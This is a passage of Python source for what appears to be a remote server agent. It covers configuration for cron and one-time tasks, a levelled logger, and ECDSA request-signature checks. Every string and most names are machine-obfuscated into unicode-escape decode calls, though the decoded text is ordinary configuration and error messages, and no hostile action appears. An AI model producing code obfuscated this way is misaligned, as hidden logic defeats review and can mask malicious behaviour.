    FOLLOW_SYMLINKS = os.getenv(codecs.decode('\\u0046\\u004f\\u004c\\u004c\\u004f\\u0057\\u005f\\u0053\\u0059\\u004d\\u004c\\u0049\\u004e\\u004b\\u0053', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    FILE_AUDIT_LOG = os.getenv(codecs.decode('\\u0046\\u0049\\u004c\\u0045\\u005f\\u0041\\u0055\\u0044\\u0049\\u0054\\u005f\\u004c\\u004f\\u0047', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    InitTask: bool = True
    onetasks: List[str] = []
    crontasks: Dict[str, str] = {}
    cronloop: bool = False
    TASK_TIMEOUT = int(os.getenv(codecs.decode('\\u0054\\u0041\\u0053\\u004b\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0033\\u0030\\u0030', 'unicode_escape')))
    CRON_CHECK_INTERVAL = int(os.getenv(codecs.decode('\\u0043\\u0052\\u004f\\u004e\\u005f\\u0049\\u004e\\u0054\\u0045\\u0052\\u0056\\u0041\\u004c', 'unicode_escape'), codecs.decode('\\u0033\\u0030', 'unicode_escape')))
    onetimetasks_log: List[Dict[str, Any]] = []
    crontasks_log: List[Dict[str, Any]] = []
    MAX_TASK_LOG_SIZE = int(os.getenv(codecs.decode('\\u004d\\u0041\\u0058\\u005f\\u0054\\u0041\\u0053\\u004b\\u005f\\u004c\\u004f\\u0047', 'unicode_escape'), codecs.decode('\\u0031\\u0030\\u0030', 'unicode_escape')))
    TEMPKEY_DEFAULT_TTL_HOURS = int(os.getenv(codecs.decode('\\u0054\\u0045\\u004d\\u0050\\u004b\\u0045\\u0059\\u005f\\u0054\\u0054\\u004c', 'unicode_escape'), codecs.decode('\\u0032\\u0034', 'unicode_escape')))
    TEMPKEY_MAX_TTL_HOURS = int(os.getenv(codecs.decode('\\u0054\\u0045\\u004d\\u0050\\u004b\\u0045\\u0059\\u005f\\u004d\\u0041\\u0058\\u005f\\u0054\\u0054\\u004c', 'unicode_escape'), codecs.decode('\\u0031\\u0036\\u0038', 'unicode_escape')))
    BASEINFO_CACHE_TTL = 3600
    STATUS_CACHE_TTL = 30
    _baseinfo_cache: Optional[Dict[str, Any]] = None
    _baseinfo_cache_time: float = 0.0
    _baseinfo_lock: Optional[asyncio.Lock] = None
    _status_cache: Optional[Dict[str, Any]] = None
    _status_cache_time: float = 0.0
    _status_lock: Optional[asyncio.Lock] = None
    HOST = os.getenv(codecs.decode('\\u0048\\u004f\\u0053\\u0054', 'unicode_escape'), codecs.decode('\\u0030\\u002e\\u0030\\u002e\\u0030\\u002e\\u0030', 'unicode_escape'))
    PORT = int(os.getenv(codecs.decode('\\u004b\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or os.getenv(codecs.decode('\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or os.environ.get(codecs.decode('\\u0053\\u0045\\u0052\\u0056\\u0045\\u0052\\u005f\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or 8000)
    KMODE = os.getenv(codecs.decode('\\u004b\\u004d\\u004f\\u0044\\u0045', 'unicode_escape'), codecs.decode('\\u0030', 'unicode_escape')).strip() or codecs.decode('\\u0030', 'unicode_escape')
    KNAME = os.getenv(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    KNAME_KEY = os.getenv(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u005f\\u004b\\u0045\\u0059', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    KPATH = os.getenv(codecs.decode('\\u004b\\u0050\\u0041\\u0054\\u0048', 'unicode_escape'), codecs.decode('', 'unicode_escape'))
    AGENT_VERSION = os.getenv(codecs.decode('\\u0041\\u0047\\u0045\\u004e\\u0054\\u005f\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e', 'unicode_escape'), codecs.decode('\\u0030\\u002e\\u0035\\u002e\\u0038\\u002d\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e', 'unicode_escape'))

    @classmethod
    def validate(cls):
        if not cls.DEBUG:
            O0_var_47 = []
            if not cls.ECDSA_PUBLIC_KEY_PEM:
                O0_var_47.append(codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003a\\u0020\\u672a\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u4e14\\u6587\\u4ef6\\u0020\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u002e\\u0070\\u0065\\u006d\\u0020\\u4e0d\\u5b58\\u5728', 'unicode_escape'))
            else:
                try:
                    CryptoManager._load_ecdsa_pubkey(cls.ECDSA_PUBLIC_KEY_PEM)
                except Exception as e:
                    O0_var_47.append(codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u0020\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
            if not cls.ECIES_PUBLIC_KEY_PEM:
                O0_var_47.append(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003a\\u0020\\u672a\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u4e14\\u6587\\u4ef6\\u0020\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u002e\\u0062\\u0036\\u0034\\u0020\\u4e0d\\u5b58\\u5728', 'unicode_escape'))
            else:
                try:
                    CryptoManager.validate_ecies_pubkey(cls.ECIES_PUBLIC_KEY_PEM)
                except Exception as e:
                    O0_var_47.append(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u0020\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
            if O0_var_47:
                Logger.error(codecs.decode('\\u274c\\u0020\\u914d\\u7f6e\\u6821\\u9a8c\\u5931\\u8d25\\u0020\\u0028\\u975e\\u0044\\u0045\\u0042\\u0055\\u0047\\u6a21\\u5f0f\\u5fc5\\u987b\\u914d\\u7f6e\\u5bc6\\u94a5\\u0029\\u003a', 'unicode_escape'))
                for O0_var_48 in O0_var_47:
                    Logger.error(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020', 'unicode_escape') + str(O0_var_48))
                Logger.info(codecs.decode('\\u000a\\U0001f4a1\\u0020\\u89e3\\u51b3\\u65b9\\u6cd5\\u003a', 'unicode_escape'))
                Logger.info(codecs.decode('\\u0020\\u0020\\u0020\\u0031\\u002e\\u0020\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u003a\\u0020\\u0065\\u0078\\u0070\\u006f\\u0072\\u0074\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003d\\u0027\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e\\u0027', 'unicode_escape'))
                Logger.info(codecs.decode('\\u0020\\u0020\\u0020\\u0032\\u002e\\u0020\\u6216\\u5c06\\u5bc6\\u94a5\\u6587\\u4ef6\\u653e\\u5165\\u0020\\u002e\\u002f\\u006b\\u0065\\u0079\\u0073\\u002f\\u0020\\u76ee\\u5f55\\u0020\\u0028\\u8fd0\\u884c\\u0020\\u0067\\u0065\\u006e\\u0065\\u0072\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079\\u0073\\u002e\\u0070\\u0079\\u0020\\u751f\\u6210\\u0029', 'unicode_escape'))
                sys.exit(1)

def _resolve_log_level():
    O0_var_49 = os.getenv(codecs.decode('\\u004c\\u004f\\u0047\\u005f\\u004c\\u0045\\u0056\\u0045\\u004c', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    if O0_var_49:
        try:
            O0_var_50 = int(O0_var_49)
        except ValueError:
            return 3
        return O0_var_50 if 0 <= O0_var_50 <= 3 or 11 <= O0_var_50 <= 15 else 3
    return 0 if Config.DEBUG else 3

class Logger:
    codecs.decode('\\u65e5\\u5fd7\\u5904\\u7406\\u5668\\u000a\\u000a\\u0020\\u0020\\u0020\\u0020\\u56db\\u7ea7\\u9608\\u503c\\u4f53\\u7cfb\\u0020\\u0028\\u5bf9\\u9f50\\u0020\\u006a\\u0073\\u002f\\u0067\\u006f\\u0029\\u003a\\u0020\\u0044\\u0045\\u0042\\u0055\\u0047\\u003d\\u0030\\u0020\\u002f\\u0020\\u0049\\u004e\\u0046\\u004f\\u003d\\u0031\\u0020\\u002f\\u0020\\u0057\\u0041\\u0052\\u004e\\u003d\\u0032\\u0020\\u002f\\u0020\\u0045\\u0052\\u0052\\u004f\\u0052\\u003d\\u0033\\u002c\\u0020\\u7ea7\\u522b\\u0020\\u003e\\u003d\\u0020\\u9608\\u503c\\u624d\\u8f93\\u51fa\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020\\u7ec6\\u5206\\u8c03\\u8bd5\\u9891\\u9053\\u5360\\u7528\\u9ad8\\u4f4d\\u0020\\u0031\\u0031\\u007e\\u0031\\u0035\\u0020\\u0028\\u4e0e\\u6807\\u51c6\\u56db\\u7ea7\\u4e92\\u4e0d\\u5e72\\u6270\\u0029\\u003a\\u000a\\u0020\\u0020\\u0020\\u0020\\u0031\\u0031\\u003d\\u57fa\\u672c\\u4fe1\\u606f\\u0020\\u0031\\u0032\\u003d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u4f20\\u8f93\\u0020\\u0031\\u0033\\u003d\\u7ec8\\u7aef\\u65e5\\u5fd7\\u0020\\u0031\\u0034\\u003d\\u7f51\\u7edc\\u7edf\\u8ba1\\u0020\\u0031\\u0035\\u003d\\u78c1\\u76d8\\u7edf\\u8ba1\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020\\u9608\\u503c\\u8bed\\u4e49\\u003a\\u0020\\u0030\\u003d\\u5168\\u91cf\\u0028\\u542b\\u5168\\u90e8\\u8c03\\u8bd5\\u9891\\u9053\\u0029\\u003b\\u0020\\u0031\\u007e\\u0033\\u003d\\u6807\\u51c6\\u56db\\u7ea7\\u003b\\u0020\\u0031\\u0031\\u007e\\u0031\\u0035\\u003d\\u5e38\\u89c4\\u65e5\\u5fd7\\u5168\\u51fa\\u0020\\u002b\\u0020\\u7cbe\\u786e\\u6253\\u5f00\\u5bf9\\u5e94\\u8c03\\u8bd5\\u9891\\u9053\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    LEVEL_DEBUG, LEVEL_INFO, LEVEL_WARN, LEVEL_ERROR = (0, 1, 2, 3)
    CHANNEL_BASE = 10
    _log_level = _resolve_log_level()

    @classmethod
    def set_log_level(cls, level: int):
        cls._log_level = level

    @classmethod
    def _enabled(cls, level: int) -> bool:
        if level >= cls.CHANNEL_BASE:
            return cls._log_level == 0 or cls._log_level == level
        O0_var_51 = cls._log_level if cls._log_level <= 3 else cls.LEVEL_INFO
        return level >= O0_var_51

    @classmethod
    def _log(cls, message: str, level: str=codecs.decode('\\u0049\\u004e\\u0046\\u004f', 'unicode_escape')):
        O0_var_52 = datetime.now().strftime(codecs.decode('\\u0025\\u0059\\u002d\\u0025\\u006d\\u002d\\u0025\\u0064\\u0020\\u0025\\u0048\\u003a\\u0025\\u004d\\u003a\\u0025\\u0053', 'unicode_escape'))
        O0_var_53 = codecs.decode('\\u005b', 'unicode_escape') + str(O0_var_52) + codecs.decode('\\u005d\\u0020\\u005b', 'unicode_escape') + str(level) + codecs.decode('\\u005d\\u0020', 'unicode_escape') + str(message)
        if level == codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'):
            print(O0_var_53, file=sys.stderr)
        else:
            print(O0_var_53)

    @classmethod
    def debug(cls, message: str, channel: int=11):
        if cls._enabled(channel):
            cls._log(message, codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'))

    @classmethod
    def info(cls, message: str):
        if cls._enabled(cls.LEVEL_INFO):
            cls._log(message, codecs.decode('\\u0049\\u004e\\u0046\\u004f', 'unicode_escape'))

    @classmethod
    def warning(cls, message: str):
        if cls._enabled(cls.LEVEL_WARN):
            cls._log(message, codecs.decode('\\u0057\\u0041\\u0052\\u004e\\u0049\\u004e\\u0047', 'unicode_escape'))

    @classmethod
    def error(cls, message: str):
        if cls._enabled(cls.LEVEL_ERROR):
            cls._log(message, codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'))

def O0_fn_1(method: str, path: str, O0_var_54: str, nonce: str, O0_var_55: str) -> str:
    if not O0_var_54:
        O0_var_54 = hashlib.sha256(b'').hexdigest()
    return str(method) + codecs.decode('\\u000a', 'unicode_escape') + str(path) + codecs.decode('\\u000a', 'unicode_escape') + str(O0_var_54) + codecs.decode('\\u000a', 'unicode_escape') + str(nonce) + codecs.decode('\\u000a', 'unicode_escape') + str(O0_var_55)

class CryptoManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u52a0\\u5bc6\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u4ee3\\u7406\\u7aef\\u4e13\\u7528\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u53ea\\u6301\\u6709\\u516c\\u94a5\\uff0c\\u4e0d\\u5b58\\u50a8\\u4efb\\u4f55\\u79c1\\u94a5\\u002f\\u654f\\u611f\\u4fe1\\u606f\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u63d0\\u4f9b\\u7b7e\\u540d\\u9a8c\\u8bc1\\u548c\\u54cd\\u5e94\\u52a0\\u5bc6\\u80fd\\u529b\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, O0_var_56: str, O0_var_57: str):
        self.ecdsa_vk = self._load_ecdsa_pubkey(O0_var_56)
        self.ecies_pubkey = None
        if O0_var_57 and O0_var_57.strip():
            O0_var_58 = O0_var_57.strip()
            try:
                if len(O0_var_58) > 32 and (not all((O0_var_59 in codecs.decode('\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046', 'unicode_escape') for O0_var_59 in O0_var_58))):
                    self.ecies_pubkey = base64.b64decode(O0_var_58)
                else:
                    self.ecies_pubkey = bytes.fromhex(O0_var_58)
            except Exception:
                self.ecies_pubkey = O0_var_58.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) if isinstance(O0_var_58, str) else O0_var_58
            if len(self.ecies_pubkey) not in (33, 65):
                Logger.warning(codecs.decode('\\u26a0\\ufe0f\\u0020\\u0020\\u8b66\\u544a\\u003a\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u516c\\u94a5\\u957f\\u5ea6\\u5f02\\u5e38\\u0020\\u0028', 'unicode_escape') + str(len(self.ecies_pubkey)) + codecs.decode('\\u5b57\\u8282\\u0029\\u002c\\u0020\\u52a0\\u5bc6\\u53ef\\u80fd\\u5931\\u8d25', 'unicode_escape'))

    @staticmethod
    def _load_ecdsa_pubkey(pem_or_der: str) -> VerifyingKey:
        O0_var_60 = pem_or_der.strip()
        if codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d', 'unicode_escape') in O0_var_60:
            try:
                return VerifyingKey.from_pem(O0_var_60)
            except Exception as e:
                raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0050\\u0045\\u004d\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        try:
            O0_var_61 = codecs.decode('', 'unicode_escape').join(O0_var_60.split())
            O0_var_62 = base64.b64decode(O0_var_61, validate=True)
        except (binascii.Error, ValueError):
            O0_var_62 = O0_var_60.encode(codecs.decode('\\u006c\\u0061\\u0074\\u0069\\u006e\\u0031', 'unicode_escape'))
        try:
            return VerifyingKey.from_der(O0_var_62)
        except Exception:
            pass
        if len(O0_var_62) in (33, 65) and O0_var_62[0] in (2, 3, 4):
            try:
                return VerifyingKey.from_string(O0_var_62, curve=TEMP_ECDSA_CURVE)
            except Exception as e:
                raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0072\\u0061\\u0077\\u0020\\u0053\\u0045\\u0043\\u0031\\u002f\\u0043\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        raise ValueError(codecs.decode('\\u0046\\u0061\\u0069\\u006c\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u006c\\u006f\\u0061\\u0064\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u002e\\u0020\\u0050\\u006c\\u0065\\u0061\\u0073\\u0065\\u0020\\u0063\\u0068\\u0065\\u0063\\u006b\\u003a\\u000a\\u0031\\u002e\\u0020\\u0050\\u0045\\u004d\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0020\\u0028\\u0073\\u0074\\u0061\\u0072\\u0074\\u0073\\u0020\\u0077\\u0069\\u0074\\u0068\\u0020\\u0027\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u0027\\u0029\\u000a\\u0032\\u002e\\u0020\\u0053\\u0074\\u0061\\u006e\\u0064\\u0061\\u0072\\u0064\\u0020\\u0058\\u002e\\u0035\\u0030\\u0039\\u0020\\u0044\\u0045\\u0052\\u0020\\u0069\\u006e\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u000a\\u0033\\u002e\\u0020\\u0052\\u0061\\u0077\\u0020\\u0053\\u0045\\u0043\\u0031\\u0020\\u0043\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0028\\u0033\\u0033\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u0029\\u0020\\u006f\\u0072\\u0020\\u0055\\u006e\\u0063\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0028\\u0036\\u0035\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u0029\\u0020\\u0069\\u006e\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u000a\\u0050\\u0072\\u006f\\u0076\\u0069\\u0064\\u0065\\u0064\\u0020\\u006b\\u0065\\u0079\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0020\\u0028\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0064\\u0029\\u003a\\u0020', 'unicode_escape') + str(len(O0_var_62)) + codecs.decode('\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u002e', 'unicode_escape'))

    @staticmethod
    def validate_ecies_pubkey(pubkey_b64: str) -> bytes:
        if not pubkey_b64 or not pubkey_b64.strip():
            raise ValueError(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0069\\u0073\\u0020\\u0065\\u006d\\u0070\\u0074\\u0079', 'unicode_escape'))
        O0_var_63 = pubkey_b64.strip()
        try:
            if len(O0_var_63) > 32 and (not all((O0_var_64 in codecs.decode('\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046', 'unicode_escape') for O0_var_64 in O0_var_63))):
                O0_var_65 = codecs.decode('', 'unicode_escape').join(O0_var_63.split())
                O0_var_66 = base64.b64decode(O0_var_65, validate=True)
            else:
                O0_var_66 = bytes.fromhex(O0_var_63)
        except Exception as e:
            raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        if len(O0_var_66) not in (33, 65):
            raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0020', 'unicode_escape') + str(len(O0_var_66)) + codecs.decode('\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u003b\\u0020\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0033\\u0033\\u0020\\u006f\\u0072\\u0020\\u0036\\u0035\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'))
        return O0_var_66

    def verify_signature(self, method: str, path: str, O0_var_67: str, nonce: str, O0_var_68: str, O0_var_69: str) -> bool:
        try:
            O0_var_70 = int(O0_var_68)
            O0_var_71 = int(time.time())
            if abs(O0_var_71 - O0_var_70) > Config.TIMESTAMP_WINDOW:
                raise ValueError(codecs.decode('\\u0054\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u0020\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0064\\u003a\\u0020\\u0064\\u0069\\u0066\\u0066\\u003d', 'unicode_escape') + str(abs(O0_var_71 - O0_var_70)) + codecs.decode('\\u0073\\u0020\\u003e\\u0020', 'unicode_escape') + str(Config.TIMESTAMP_WINDOW) + codecs.decode('\\u0073', 'unicode_escape'))
        except ValueError as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        O0_var_72 = O0_fn_1(method, path, O0_var_67, nonce, O0_var_68).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_73 = hashlib.sha256(O0_var_72)
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020', 'unicode_escape') + repr(O0_var_72))
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u0053\\u0048\\u0041\\u0032\\u0035\\u0036\\u003a\\u0020', 'unicode_escape') + str(O0_var_73.hexdigest()))
        try:
            O0_var_74 = base64.b64decode(O0_var_69)
            O0_var_75 = len(O0_var_74)
            if O0_var_75 == 64:
                O0_var_76 = sigdecode_string
                Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u4fa6\\u6d4b\\u5230\\u0020\\u0052\\u0061\\u0077\\u0020\\u683c\\u5f0f\\u7b7e\\u540d', 'unicode_escape'))
            elif O0_var_75 > 64 and O0_var_74[0] == 48:
                O0_var_76 = sigdecode_der
                Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u4fa6\\u6d4b\\u5230\\u0020\\u0044\\u0045\\u0052\\u0020\\u683c\\u5f0f\\u7b7e\\u540d', 'unicode_escape'))
            else:
                O0_var_76 = sigdecode_der
            self.ecdsa_vk.verify(O0_var_74, O0_var_72, hashfunc=hashlib.sha256, sigdecode=O0_var_76)
        except BadSignatureError:
            Logger.info(codecs.decode('\\u274c\\u0020\\u7b7e\\u540d\\u9a8c\\u8bc1\\u5931\\u8d25\\u003a\\u0020\\u574f\\u7b7e\\u540d', 'unicode_escape'))
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0062\\u0061\\u0064\\u0020\\u0073\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065', 'unicode_escape'))
        except Exception as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        return True

    def identify_signer(self, method: str, path: str, O0_var_77: str, nonce: str, O0_var_78: str, O0_var_79: str, O0_var_80: Optional[VerifyingKey]=None) -> str:
        try:
            O0_var_81 = int(O0_var_78)
            O0_var_82 = int(time.time())
            if abs(O0_var_82 - O0_var_81) > Config.TIMESTAMP_WINDOW:
                raise ValueError(codecs.decode('\\u0054\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u0020\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0064\\u003a\\u0020\\u0064\\u0069\\u0066\\u0066\\u003d', 'unicode_escape') + str(abs(O0_var_82 - O0_var_81)) + codecs.decode('\\u0073\\u0020\\u003e\\u0020', 'unicode_escape') + str(Config.TIMESTAMP_WINDOW) + codecs.decode('\\u0073', 'unicode_escape'))
        except ValueError as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        O0_var_83 = O0_fn_1(method, path, O0_var_77, nonce, O0_var_78).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_84 = hashlib.sha256(O0_var_83)
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020', 'unicode_escape') + repr(O0_var_83))
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u0053\\u0048\\u0041\\u0032\\u0035\\u0036\\u003a\\u0020', 'unicode_escape') + str(O0_var_84.hexdigest()))
        if self._verify_with(self.ecdsa_vk, O0_var_79, O0_var_83):
            Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u7b7e\\u540d\\u6765\\u6e90\\u003a\\u0020\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u0020\\u0028\\u63a7\\u5236\\u7aef\\u9759\\u6001\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
            return codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063', 'unicode_escape')
        if O0_var_80 is not None and self._verify_with(O0_var_80, O0_var_79, O0_var_83):
            Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u7b7e\\u540d\\u6765\\u6e90\\u003a\\u0020\\u0074\\u0065\\u006d\\u0070\\u0020\\u0028\\u4e34\\u65f6\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
            return codecs.decode('\\u0074\\u0065\\u006d\\u0070', 'unicode_escape')
        Logger.info(codecs.decode('\\u274c\\u0020\\u7b7e\\u540d\\u9a8c\\u8bc1\\u5931\\u8d25\\u003a\\u0020\\u9759\\u6001\\u5bc6\\u94a5\\u4e0e\\u4e34\\u65f6\\u5bc6\\u94a5\\u5747\\u4e0d\\u5339\\u914d', 'unicode_escape'))
